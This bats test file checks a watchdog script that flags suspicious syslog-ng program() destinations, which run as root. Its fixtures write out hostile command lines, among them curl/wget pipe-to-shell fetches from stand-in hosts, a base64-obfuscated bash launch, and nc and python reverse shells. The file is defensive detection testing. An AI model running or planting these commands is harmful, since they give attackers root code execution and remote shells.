#!/usr/bin/env bats
# L2 bats functional tests for the syslog-ng-exec-watchdog scan script.
#
# syslog-ng `program("…")` destinations run a program AS ROOT, fed every
# matching log message on its stdin — a log-event-triggered exec surface. A
# program under a writable root, relative-with-slash, bare, or carrying an
# injection pattern is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the config
# in a tmp sandbox via SELFDEF_SYSLOGNG_FILE / _D.
#
# Run with: bats packaging/test/L2-syslog-ng-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd/syslog-ng-exec-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/syslog-ng.conf"
    CONFD="${TMP}/conf.d"; mkdir -p "${CONFD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SYSLOGNG_PROFILE="${PROFILE:-report}" \
    SELFDEF_SYSLOGNG_BASELINE="${BASELINE}" \
    SELFDEF_SYSLOGNG_FILE="${CONF_F:-$CONF}" \
    SELFDEF_SYSLOGNG_D="${CONFD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no syslog-ng config → ok / no_syslog_ng" {
    CONF_F="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_syslog_ng"'
    cap | grep -q '"severity":"ok"'
}

@test "benign program() destination, first run → ok / baseline_initial" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / syslog_ng_exec_intact" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"syslog_ng_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "program() under a writable root → alert / syslog_ng_exec_suspicious" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd                                   # benign baseline
    printf 'destination d_evil { program("/tmp/.x"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"syslog_ng_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "program() carrying a curl|sh payload → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("curl -s http://evil | sh"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a bare program() target → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("evilprog"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign program change → warn / syslog_ng_exec_changed" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_prog { program("/usr/bin/logcollector2"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"syslog_ng_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr/bin program() target is NOT flagged" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious program" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("/tmp/.x"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — syslog-ng-exec inventory enumerates log-event-trigger root-exec surface)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (wget-pipe-sh in program()): wget bootstrap → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("wget -qO- http://attacker/p | sh"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in program()): obfuscation → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("echo YmFzaCAtaQ== | base64 -d | bash"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (program() under /var/tmp): writable-root expansion" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("/var/tmp/.attacker"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (conf.d drop-in also scanned — not only main syslog-ng.conf)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_dropin_evil { program("/tmp/.dropin-attacker"); };\n' > "${CONFD}/99-evil.conf"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable syslog-ng.conf itself → alert)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-syslog-ng-exec -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): syslog-ng-exec-watchdog does NOT refresh baseline on suspicious-program detection — alert STAYS until operator updates" {
    # Log-event-trigger root-exec persistence — suspicious-program alert
    # MUST persist across runs until operator explicitly re-baselines.
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("/tmp/.x"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"syslog_ng_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (program() under /dev/shm tmpfs writable-root — full coverage)" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("/dev/shm/.attacker"); };\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (relative-with-slash program 'sub/dir/p' → alert)" {
    # Relative-with-slash = PWD-at-exec attacker primitive.
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("sub/dir/evil"); };\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (whitespace tolerance: 'program  (  \"/tmp/.evil\"  )' multi-space variant still triggers alert)" {
    # Attacker may use multi-spaces between program(  ... ) to evade
    # naive grep. Lock whitespace-tolerant parser.
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program  (  "/tmp/.evil"  ); };\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (program() under /home: user-writable hijack coverage — sister axis to rsyslog-exec /home)" {
    # Sister to the rsyslog-exec /home INVARIANT just added. /home
    # is the user-writable surface — an attacker with a regular user
    # account can drop a malicious binary into their home and have
    # syslog-ng exec it AS ROOT on every matching log event. Lock
    # axis-symmetry on /home for the syslog-ng program() surface
    # (T1037/T1546 — log-event-trigger root-exec persistence via
    # the program() destination).
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("/home/user/.evil"); };\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in syslog-ng program(): netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. Lock the netcat axis on the
    # syslog-ng program() log-event-trigger root-exec persistence
    # surface (T1037/T1546 — program() destination invokes a
    # subprocess AS ROOT for each matching log event; attacker who
    # plants nc -e shell binary path gets remote shell on every
    # matching event).
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("/bin/sh -c \\"nc -e /bin/sh 1.1.1.1 4444\\""); };\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on syslog-ng program() surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the syslog-ng
    # program() log-event-trigger root-exec persistence surface
    # (T1037/T1546 — program() destination invokes a subprocess
    # AS ROOT for each matching log event).
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\""); };\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (program() under /var/tmp — writable-root axis-symmetric expansion on syslog-ng surface)" {
    # Sister to /home + /dev/shm + /tmp syslog-ng program()
    # writable-root INVARIANTs. /var/tmp writable + persistent.
    # Closes axis-symmetric coverage on T1037/T1546 syslog-ng
    # program() log-event-trigger root-exec surface.
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'destination d_evil { program("/var/tmp/.evil-collector"); };\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
